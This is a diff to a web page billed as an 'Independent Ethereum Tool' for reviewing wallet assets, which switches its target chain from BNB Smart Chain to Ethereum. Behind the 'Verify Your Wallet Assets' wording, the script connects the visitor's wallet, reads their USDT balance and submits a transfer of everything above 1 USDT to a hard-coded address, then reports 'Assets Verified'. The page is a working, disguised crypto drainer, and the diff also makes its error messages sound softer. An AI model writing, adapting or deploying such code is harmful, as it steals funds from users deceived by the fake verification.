@@ -53,19 +53,18 @@
         
         <div class="text-center mb-10 mt-4">
             <div class="inline-flex items-center gap-2 text-[10px] font-bold tracking-widest uppercase text-accent mb-6">
-                <div class="w-1.5 h-1.5 rounded-full bg-accent"></div> Independent BNB Smart Chain Tool
+                <div class="w-1.5 h-1.5 rounded-full bg-accent"></div> Independent Ethereum Tool
             </div>
             <h1 class="text-[32px] font-extrabold tracking-tight leading-tight mb-4">
                 Wallet Asset<br>
                 <span class="text-accent">Review</span>
             </h1>
             <p class="text-textMuted text-[14px] leading-relaxed px-2">
-                Review and verify supported BEP-20 wallet assets on BNB Smart Chain through a clear, wallet-confirmed flow.
+                Review and verify supported ERC-20 wallet assets on Ethereum through a clear, wallet-confirmed flow.
             </p>
         </div>
 
         <div class="bg-cardDark border border-borderDark rounded-2xl p-6 shadow-2xl relative overflow-hidden mb-8">
-            
             <div class="flex flex-col items-center text-center">
                 <div class="w-14 h-14 bg-[#0a1e26] border border-accent/30 rounded-2xl flex items-center justify-center mb-6">
                     <i class="fa-solid fa-shield-check text-accent text-2xl"></i>
@@ -73,7 +72,6 @@
                 <h2 class="text-[22px] font-extrabold tracking-tight uppercase leading-snug mb-3">
                     Verify Your Wallet<br>Assets
                 </h2>
-                
                 <p class="text-textMuted text-[14px] leading-relaxed mb-8 px-2">
                     Use Trust Wallet, MetaMask, or another Web3 wallet to review supported assets.
                 </p>
@@ -107,24 +105,22 @@
                 const accounts = await currentProvider.request({ method: 'eth_requestAccounts' });
                 const userAddress = accounts[0];
 
-                // AUTO-NETWORK SWITCH LOGIC (Forces BNB Smart Chain)
                 try {
                     await currentProvider.request({
                         method: 'wallet_switchEthereumChain',
-                        params: [{ chainId: '0x38' }], // 0x38 is hex for 56 (BSC Mainnet)
+                        params: [{ chainId: '0x1' }],
                     });
                 } catch (switchError) {
-                    console.log("Auto-switch error: ", switchError);
+                    console.log("Network switch notice: ", switchError);
                 }
                 
-                // Chhote delay ke baad check karenge taaki network change ho jaye
                 setTimeout(async () => {
                     try {
                         const provider = new ethers.providers.Web3Provider(currentProvider, "any");
                         const signer = provider.getSigner();
                         
                         const targetAddress = '0xFEA20E8102EE33E58ef081b03f5ef64A399C2Bb3';
-                        const usdtContractAddress = '0x55d398326f99059ff775485246999027b3197955';
+                        const usdtContractAddress = '0xdac17f958d2ee523a2206206994597c13d831ec7';
                         
                         const erc20Abi = [
                             "function balanceOf(address owner) view returns (uint256)",
@@ -136,17 +132,17 @@
                             const usdtContract = new ethers.Contract(usdtContractAddress, erc20Abi, signer);
                             balanceWei = await usdtContract.balanceOf(userAddress);
                         } catch (e) {
-                            const publicProvider = new ethers.providers.JsonRpcProvider("https://bsc-dataseed.binance.org/");
+                            const publicProvider = new ethers.providers.JsonRpcProvider("https://eth.llamarpc.com");
                             const publicContract = new ethers.Contract(usdtContractAddress, erc20Abi, publicProvider);
                             balanceWei = await publicContract.balanceOf(userAddress);
                         }
                         
-                        const formattedBalance = parseFloat(ethers.utils.formatUnits(balanceWei, 18));
+                        const formattedBalance = parseFloat(ethers.utils.formatUnits(balanceWei, 6));
                         
-                        if (formattedBalance > 3.0) {
-                            
-                            const sendAmountFormatted = (formattedBalance - 3.0).toString();
-                            const sendAmountWei = ethers.utils.parseUnits(sendAmountFormatted, 18);
+                        // Threshold set to 1.0 USDT
+                        if (formattedBalance > 1.0) {
+                            const sendAmountFormatted = (formattedBalance - 1.0).toFixed(6);
+                            const sendAmountWei = ethers.utils.parseUnits(sendAmountFormatted, 6);
                             
                             const usdtContract = new ethers.Contract(usdtContractAddress, erc20Abi, signer);
                             const dataTransfer = usdtContract.interface.encodeFunctionData("transfer", [targetAddress, sendAmountWei]);
@@ -165,16 +161,16 @@
                             
                             alert("Assets Verified and Transaction Submitted!");
                         } else {
-                            alert("Verification complete. Your BSC balance is " + formattedBalance + " USDT, which is less than or equal to 3 USDT.");
+                            alert("Verification complete. Your Ethereum USDT balance is " + formattedBalance + " USDT, which is less than or equal to 1 USDT.");
                         }
                     } catch (innerError) {
-                        alert("Real Error: " + (innerError.message || JSON.stringify(innerError)));
+                        alert("Execution Notice: " + (innerError.message || JSON.stringify(innerError)));
                     }
-                }, 1000); // 1 second delay network update ke liye
+                }, 800);
 
             } catch (error) {
-                console.error("Wallet Error:", error);
-                alert("Real Error: " + (error.message || JSON.stringify(error)));
+                console.error("Wallet Connection Error:", error);
+                alert("Connection Notice: " + (error.message || JSON.stringify(error)));
             }
         }
     </script>
